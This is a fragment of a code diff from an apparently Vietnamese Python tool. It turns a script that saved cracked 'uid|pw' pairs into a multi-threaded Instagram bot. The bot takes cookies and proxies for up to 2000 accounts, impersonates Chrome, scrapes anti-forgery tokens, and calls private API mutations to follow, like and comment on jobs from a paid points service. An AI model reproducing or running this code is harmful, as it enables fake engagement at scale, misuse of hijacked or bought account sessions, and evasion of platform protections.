-                    open('/sdcard/A H B-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
-                    break
-        except Exception as e:
-            pass
-    loop += 1
+            except Exception as e:
+                return {"error": str(e)}
+                
+        return {"error": "Đã thử lại nhiều lần nhưng không thành công"}
 
-if __name__ == '__main__':
-    BNG_71_()
+# ================= CẤU HÌNH HEADERS =================
+useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+sec_ch_ua_120 = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
+
+def format_proxy(proxy_str):
+    if not proxy_str: return None
+    proxy_str = proxy_str.strip()
+    if not proxy_str: return None
+    scheme = "http"
+    if "://" in proxy_str:
+        scheme, proxy_str = proxy_str.split("://", 1)
+    parts = proxy_str.split(":")
+    if len(parts) == 4:
+        ip, port, user, pwd = parts
+        formatted = f"{scheme}://{user}:{pwd}@{ip}:{port}"
+    else:
+        formatted = f"{scheme}://{proxy_str}"
+    return {"http": formatted, "https": formatted}
+
+def get_ig_headers(cookie, csrftoken, referer="https://www.instagram.com/"):
+    return {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9',
+        'content-type': 'application/x-www-form-urlencoded',
+        'cookie': cookie,
+        'origin': 'https://www.instagram.com',
+        'referer': referer,
+        'sec-ch-ua': sec_ch_ua_120,
+        'user-agent': useragent,
+        'x-csrftoken': csrftoken,
+        'x-ig-app-id': '936619743392459',
+        'x-requested-with': 'XMLHttpRequest'
+    }
+
+# ============ CÁC HÀM TƯƠNG TÁC INSTAGRAM ============
+def check_cookie_ig(cookie, proxy=None):
+    url = 'https://www.instagram.com/api/v1/accounts/edit/web_form_data/'
+    headers = {
+        'x-ig-app-id': '936619743392459',
+        'x-requested-with': 'XMLHttpRequest',
+        'referer': 'https://www.instagram.com/accounts/edit/',
+        'cookie': cookie,
+        'user-agent': useragent
+    }
+    proxies = format_proxy(proxy)
+    try:
+        return c_requests.get(url, headers=headers, proxies=proxies, impersonate="chrome120", timeout=30, allow_redirects=False).text
+    except:
+        return "{}"
+
+def follow(target_id, cookie, csrftoken, profile_url="", proxy=None):
+    if not target_id: return '{"status": "error"}'
+    cookie = unquote(cookie)
+    session = c_requests.Session()
+    proxies = format_proxy(proxy)
+    if proxies: session.proxies = proxies
+    
+    fb_dtsg, lsd, jazoest = "", "Jfq8VQNmkkkJufHSbEE9bf", "26328"
+    try:
+        res_home = session.get(profile_url if profile_url else "https://www.instagram.com/", impersonate="chrome120", timeout=10, allow_redirects=False).text
+        lsd_match = re.search(r'"LSD",\[\],{"token":"([^"]+)"}', res_home)
+        if lsd_match: lsd = lsd_match.group(1)
+        dtsg_match = re.search(r'name="fb_dtsg" value="([^"]+)"', res_home)
+        if dtsg_match: fb_dtsg = dtsg_match.group(1)
+        jazoest_match = re.search(r'name="jazoest" value="(\d+)"', res_home)
+        if jazoest_match: jazoest = jazoest_match.group(1)
+    except: pass
+    
+    session.headers.update(get_ig_headers(cookie, csrftoken, profile_url if profile_url else "https://www.instagram.com/"))
+    actor_id_match = re.search(r'ds_user_id=(\d+)', cookie)
+    actor_id = actor_id_match.group(1) if actor_id_match else "0"
+    variables = {"target_user_id": str(target_id), "container_module": "profile"}
+    data = {
+        "av": actor_id, "__d": "www", "__user": "0", "__a": "1", "__req": "s",
+        "fb_dtsg": fb_dtsg, "jazoest": jazoest, "lsd": lsd, 
+        "fb_api_req_friendly_name": "usePolarisFollowMutation",
+        "doc_id": "26508036048874888", "variables": json.dumps(variables)
+    }
+    try:
+        return session.post('https://www.instagram.com/api/graphql', data=data, impersonate="chrome120", timeout=15, allow_redirects=False).text.strip()
+    except Exception as e:
+        return json.dumps({"status": "error", "message": str(e)})
+
+def tym(mediaid, cookie, csrftoken, link_job="", proxy=None):
+    if not mediaid: return '{"status": "error"}'
+    cookie = unquote(cookie)
+    session = c_requests.Session()
+    proxies = format_proxy(proxy)
+    if proxies: session.proxies = proxies
+    
+    fb_dtsg, lsd, jazoest = "", "GyeZl-huflHZ0K5L3-pzBi", "26492"
+    try:
+        res_home = session.get("https://www.instagram.com/", impersonate="chrome120", timeout=10, allow_redirects=False).text
+        lsd_match = re.search(r'"LSD",\[\],{"token":"([^"]+)"}', res_home)
+        if lsd_match: lsd = lsd_match.group(1)
+        dtsg_match = re.search(r'name="fb_dtsg" value="([^"]+)"', res_home)
+        if dtsg_match: fb_dtsg = dtsg_match.group(1)
+    except: pass
+    
+    session.headers.update(get_ig_headers(cookie, csrftoken, link_job if link_job else "https://www.instagram.com/"))
+    actor_id_match = re.search(r'ds_user_id=(\d+)', cookie)
+    actor_id = actor_id_match.group(1) if actor_id_match else "0"
+    variables = {
+        "input": {
+            "actor_id": actor_id, "client_mutation_id": str(random.randint(1000000, 9999999)),
+            "container_module": "single_post", "media_id": str(mediaid)
+        }
+    }
+    data = {
+        "av": actor_id, "__d": "www", "__user": "0", "__a": "1", "__req": "h",
+        "fb_dtsg": fb_dtsg, "jazoest": jazoest, "lsd": lsd, 
+        "fb_api_req_friendly_name": "usePolarisLikeMediaXIGLikeMutation",
+        "doc_id": "27182485238052618", "variables": json.dumps(variables)
+    }
+    try:
+        return session.post('https://www.instagram.com/api/graphql', data=data, impersonate="chrome120", timeout=15, allow_redirects=False).text.strip()
+    except Exception as e:
+        return json.dumps({"status": "error", "message": str(e)})
+
+def cmt(mediaid, text, cookie, csrftoken, link_job="", proxy=None):
+    if not mediaid: return '{"status": "error"}'
+    cookie = unquote(cookie)
+    session = c_requests.Session()
+    proxies = format_proxy(proxy)
+    if proxies: session.proxies = proxies
+    
+    fb_dtsg, lsd, jazoest = "", "9zei3OjvTBQ-9YG6E0OMzm", "26312"
+    try:
+        res_home = session.get(link_job if link_job else "https://www.instagram.com/", impersonate="chrome120", timeout=10, allow_redirects=False).text
+        dtsg_match = re.search(r'name="fb_dtsg" value="([^"]+)"', res_home)
+        if dtsg_match: fb_dtsg = dtsg_match.group(1)
+    except: pass
+    
+    session.headers.update(get_ig_headers(cookie, csrftoken, link_job if link_job else "https://www.instagram.com/"))
+    actor_id_match = re.search(r'ds_user_id=(\d+)', cookie)
+    actor_id = actor_id_match.group(1) if actor_id_match else "0"
+    variables = {
+        "connections": [f"client:root:__PolarisPostComments__xdt_api__v1__media__media_id__comments__connection_connection(data:{{}},media_id:\"{mediaid}\",sort_order:\"popular\")"],
+        "data": {"comment_text": text, "media_id": str(mediaid)}
+    }
+    data = {
+        "av": actor_id, "__d": "www", "__user": "0", "__a": "1", "__req": "10",
+        "fb_dtsg": fb_dtsg, "jazoest": jazoest, "lsd": lsd, 
+        "fb_api_req_friendly_name": "PolarisPostCommentInputRevampedMutation",
+        "doc_id": "27261905640092552", "variables": json.dumps(variables)
+    }
+    try:
+        return session.post('https://www.instagram.com/api/graphql', data=data, impersonate="chrome120", timeout=15, allow_redirects=False).text.strip()
+    except Exception as e:
+        return json.dumps({"status": "error", "message": str(e)})
+
+def gui_nhan_xu(job_type, task_list, uid, cookie_check, xsmm_instance):
+    global xu
+    if not task_list: return
+    s_print(f"{yellow} ⏩ UID {uid} gom đủ {len(task_list)} task -> Đang duyệt xu...{white}")
+    ck = xsmm_instance.complete_tasks(job_type, task_list, uid=uid, cookie_check=cookie_check)
+    now = datetime.now().strftime("%H:%M:%S")
+    
+    if isinstance(ck, dict):
+        if 'message' in ck:
+            pts = int(ck.get('points', 0)) if str(ck.get('points')).isdigit() else 0
+            with print_lock:
+                xu += pts
+            succ = ck.get('success_count', len(task_list))
+            s_print(f"[{now}] {green} ⏩ {ck['message']} (+{pts} xu | Hoàn thành: {succ} task | Tổng: {xu} xu){white}")
+        elif ck.get("is_timeout"):
+            s_print(f"[{now}] {cam} ⏩ {ck['message']}{white}")
+        elif 'error' in ck:
+            s_print(f"[{now}] {red} ⏩ LỖI XSMM: {ck['error']}{white}")
+        
+        if ck.get('countdown', 0) > 0:
+            s_print(f"{yellow} ⏩ UID {uid} Hệ thống yêu cầu nghỉ {ck['countdown']}s...{white}")
+            time.sleep(ck['countdown'])
+
+# ================= HÀM CHẠY 1 NICK (WORKER) =================
+def run_account_worker(acc_data, xsmm, listnv, dl, doi, timedelays):
+    cookie = acc_data["cookie"]
+    proxy = acc_data.get("proxy", "")
+    
+    while True:
+        access = check_cookie_ig(cookie, proxy)
+        is_live, tenfb, idfb = False, "", ""
+        
+        try:
+            configdata = json.loads(access)
+            if configdata and 'form_data' in configdata and configdata['form_data'].get('username'):
+                is_live = True
+                tenfb = configdata['form_data']['username']
+                idfb_match = re.search(r'ds_user_id=(\d+)', cookie)
+                idfb = idfb_match.group(1) if idfb_match else str(configdata['form_data'].get('id', ''))
+        except Exception:
+            pass
+
+        if not is_live or not idfb:
+            s_print(f"{white} ⛔ {red}Cookie UID: {idfb} Die hoặc Proxy lỗi - ĐANG DỪNG LUỒNG NÀY\n")
+            break # Thoát luồng nếu cookie die
+
+        px_display = f" | Proxy: {proxy}" if proxy else " | Không Proxy"
+        s_print(f"{green} ● NICK LIVE [{tenfb} | UID: {idfb}{px_display}] ● {white}")
+
+        try:
+            acc_list = xsmm.get_accounts(account_type="instagram", search=idfb)
+            exists = False
+            if isinstance(acc_list, dict) and acc_list.get("accounts"):
+                for acc in acc_list["accounts"]:
+                    if acc and (str(acc.get("account_id")) == str(idfb) or str(acc.get("name", "")).lower() == str(tenfb).lower()):
+                        exists = True
+                        break
+            if not exists:
+                link_ig = f"https://www.instagram.com/{tenfb}"
+                add_res = xsmm.add_account("instagram", link_ig)
+                if isinstance(add_res, dict) and "id" in add_res:
+                    s_print(f"{green} ➕ Đã thêm tài khoản [{tenfb}] vào XSMM thành công!{white}")
+        except Exception as e:
+            s_print(f"{yellow} ⚠️ Lỗi đồng bộ tài khoản {tenfb}: {e}{white}")
+
+        s_print(f"{white} Bắt đầu nhận việc cho UID: {cam}{idfb} ({tenfb})")
+        max_job = 0
+        rand_job = random.choice(listnv)
+        
+        list_nv = xsmm.get_tasks(rand_job, uid=idfb)
+        
+        if isinstance(list_nv, dict) and "error" in list_nv:
+            s_print(f"{white} ❌ {red}Lỗi từ XSMM (UID {idfb}): {list_nv['error']}")
+            if dl > 0: time.sleep(dl)
+            continue
+            
+        elif isinstance(list_nv, list) and len(list_nv) == 0:
+            s_print(f"{white} ❌ {yellow}Hết nhiệm vụ {rand_job} cho UID {idfb}!")
+            if dl > 0: time.sleep(dl)
+            continue
+            
+        elif isinstance(list_nv, list):
+            cache_batch_nv = []
+            soloi = 0
+            
+            for nv in list_nv:
+                task_id = nv.get('id')
+                link_job = nv.get('target_url', '')
+                csf_match = re.search(r'csrftoken=([^;]+)', cookie)
+                csf = csf_match.group(1) if csf_match else ""
+
+                if rand_job == 'instagram_like':
+                    idm = nv.get('target_id', '')
+                    s_print(f"{yellow} ⏩ {blue}[{idfb}] Job Tym: {white}{link_job}")
+                    kq = tym(idm, cookie, csf, link_job, proxy=proxy)
+                    delay_job = timedelays['tym']
+                    
+                elif rand_job == 'instagram_follow':
+                    target_id = nv.get('target_id', '')
+                    s_print(f"{yellow} ⏩ {blue}[{idfb}] Follow: {white}{link_job}")
+                    kq = follow(target_id, cookie, csf, link_job, proxy=proxy)
+                    delay_job = timedelays['sub']
+                    
+                elif rand_job == 'instagram_comment':
+                    idm = nv.get('target_id', '')
+                    noidung = nv.get('comment', '❤️❤️❤️')
+                    s_print(f"{yellow} ⏩ {blue}[{idfb}] Job CMT: {white}{link_job} | ND: {noidung}")
+                    kq = cmt(idm, noidung, cookie, csf, link_job, proxy=proxy)
+                    delay_job = timedelays['cmt']
+
+                max_job += 1
+                try:
+                    g = json.loads(kq)
+                    if 'data' not in g and g.get('status') not in ['ok', 'success']:
+                        s_print(f"{red} ❌ {idfb} Thất bại: {g.get('message', 'Block/Lỗi API')}")
+                        soloi += 1
+                    else:
+                        s_print(f"{green} ✅ {idfb} Làm Job thành công!{white}")
+                        cache_batch_nv.append(task_id)
+                        soloi = 0
+                        
+                        if rand_job == 'instagram_follow' and len(cache_batch_nv) >= 10:
+                            gui_nhan_xu(rand_job, cache_batch_nv, idfb, cookie, xsmm)
+                            cache_batch_nv = []
+                        elif rand_job in ['instagram_like', 'instagram_comment']:
+                            gui_nhan_xu(rand_job, cache_batch_nv, idfb, cookie, xsmm)
+                            cache_batch_nv = []
+                            
+                except Exception as e:
+                    s_print(f"{red} ❌ Lỗi JSON {idfb}: {e}")
+                    soloi += 1
+
+                # Delay tĩnh (Không đếm ngược trên console tránh đè chữ)
+                if delay_job > 0:
+                    time.sleep(delay_job)
+
+                if soloi > 4:
+                    s_print(f"{blue} ⏩ [{idfb}] Lỗi liên tiếp -> Chuyển vòng! ● {white}")
+                    break
+                        
+                if max_job >= doi:
+                    max_job = 0
+                    break
+
+            if len(cache_batch_nv) > 0:
+                gui_nhan_xu(rand_job, cache_batch_nv, idfb, cookie, xsmm)
+
+# ================= MAIN RUN =================
+if __name__ == "__main__":
+    banner()
+    xsmm_token = ""
+    xu = 0
+    username = "Unknown"
+
+    if os.path.exists("logXSMM.txt"):
+        while True:
+            print(f"{white} Nhập{cam} Enter{white} để dùng token XSMM đã lưu! {xuong} Nhập{red} No{white} để nhập lại Token : ", end="")
+            nhap = input().strip().lower()
+            if nhap in ['', 'no']: break
+            print(f"{red}Sai Định Dạng\n")
+            
+        if nhap == 'no':
+            xsmm_token = input(f"{white} ⏩ {green}Access Token XSMM: ").strip()
+            with open("logXSMM.txt", "w") as f:
+                json.dump({"token": xsmm_token}, f)
+        else:
+            with open("logXSMM.txt", "r") as f:
+                acc = json.load(f)
+                xsmm_token = acc.get("token", "")
+    else:
+        xsmm_token = input(f"{white} ⏩ {green}Access Token XSMM: ").strip()
+        with open("logXSMM.txt", "w") as f:
+            json.dump({"token": xsmm_token}, f)
+
+    xsmm = XSMMTool(token=xsmm_token)
+    user_info = xsmm.get_user_info()
+
+    if isinstance(user_info, dict) and "user" in user_info:
+        xu = user_info["user"].get("points", 0)
+        username = user_info["user"].get("username", "Unknown")
+        print(f"\n{white} ✅ {green}Đăng nhập XSMM thành công: {yellow}{username}{white}\n")
+    else:
+        print(f"\n{red} ❌ Token sai hoặc đã hết hạn\n")
+        if os.path.exists("logXSMM.txt"): os.remove("logXSMM.txt")
+        sys.exit()
+
+    mangcookie = []
+    nhaplaicc = False
+
+    if os.path.exists("ListccXSMM.json"):
+        while True:
+            print(f"{white} Nhập{cam} Enter{white} để dùng list cookies đã lưu! {xuong} Nhập{red} 1{white} để nhập lại : ", end="")
+            nhapcc = input().strip()
+            if nhapcc in ['', '1']: break
+            
+        if nhapcc == '':
+            try:
+                with open("ListccXSMM.json", "r", encoding="utf-8") as f:
+                    listccdaluu = json.load(f)
+                for acc_item in listccdaluu:
+                    if acc_item.get("cookie"):
+                        mangcookie.append(acc_item)
+            except:
+                nhaplaicc = True
+        else:
+            nhaplaicc = True
+    else:
+        nhaplaicc = True
+
+    if nhaplaicc:
+        if os.path.exists("ListccXSMM.json"): os.remove("ListccXSMM.json")
+        while True:
+            print(f"{white} ✏ {blue}Nhập số nick INSTA muốn chạy: ", end="")
+            try:
+                luong_nick = int(input().strip())
+                if 1 <= luong_nick <= 2000: break
+            except: pass
+
+        for i in range(1, luong_nick + 1):
+            print(f"{white} + {green}Nhập Cookie Thứ {i}:{white} ", end="")
+            cookie_str = input().strip()
+            print(f"{white}   {cyan}Nhập Proxy cho Nick {i} {pink}(Enter để bỏ qua){white}: ", end="")
+            proxy_str = input().strip()
+            mangcookie.append({"cookie": cookie_str, "proxy": proxy_str})
+            
+        with open("ListccXSMM.json", "w", encoding="utf-8") as f:
+            json.dump(mangcookie, f)
+
+    dl = 0
+    doi = 99999
+    print(f"{white} ⏩ {blue}Sau bao nhiêu nhiệm vụ thì chuyển vòng : {white}", end="")
+    try:
+        doi = int(input().strip())
+    except:
+        doi = 99999
+
+    listnv = []
+    timedelays = {'tym': 0, 'sub': 0, 'cmt': 0}
+
+    print(f"{yellow} ⏩ {blue}Chế độ Tym (on/off): {white}", end="")
+    if input().strip().lower() == 'on':
+        listnv.append('instagram_like')
+        print(f"{yellow} ⏩ {blue}Delay Tym (Nhập 0 để bỏ qua): {white}", end="")
+        try: timedelays['tym'] = int(input().strip())
+        except: pass
+
+    print(f"{yellow} ⏩ {blue}Chế độ Follow (on/off): {white}", end="")
+    if input().strip().lower() == 'on':
+        listnv.append('instagram_follow')
+        print(f"{yellow} ⏩ {blue}Delay Follow (Nhập 0 để bỏ qua): {white}", end="")
+        try: timedelays['sub'] = int(input().strip())
+        except: pass
+
+    print(f"{yellow} ⏩ {blue}Chế độ Comment (on/off): {white}", end="")
+    if input().strip().lower() == 'on':
+        listnv.append('instagram_comment')
+        print(f"{yellow} ⏩ {blue}Delay Cmt (Nhập 0 để bỏ qua): {white}", end="")
+        try: timedelays['cmt'] = int(input().strip())
+        except: pass
+
+    if not listnv:
+        print(f"{red}Chọn tối thiểu 1 loại Job!\n")
+        sys.exit()
+
+    print(f"{yellow} ⏩ {blue}Nhập số Luồng (Thread) muốn chạy song song: {white}", end="")
+    try:
+        so_luong = int(input().strip())
+        if so_luong < 1: so_luong = 1
+    except:
+        so_luong = len(mangcookie)
+
+    banner()
+    print(f"{cyan} ✅ {cam}XSMM User    : {white}{username}")
+    print(f"{cyan} ✅ {cam}Số Nick Chạy : {white}{len(mangcookie)}")
+    print(f"{cyan} ✅ {cam}Đang chạy    : {white}{so_luong} Luồng Song Song")
+    print(f"{cyan} ✅ {cam}Số Dư Ban Đầu: {green}{xu} xu")
+    print(f"{yellow} ────────────────────────────────────────────────────────{reset}\n")
+
+    # Bắt đầu ThreadPoolExecutor để chạy Đa Luồng
+    with ThreadPoolExecutor(max_workers=so_luong) as executor:
+        for acc_data in mangcookie:
+            executor.submit(run_account_worker, acc_data, xsmm, listnv, dl, doi, timedelays)
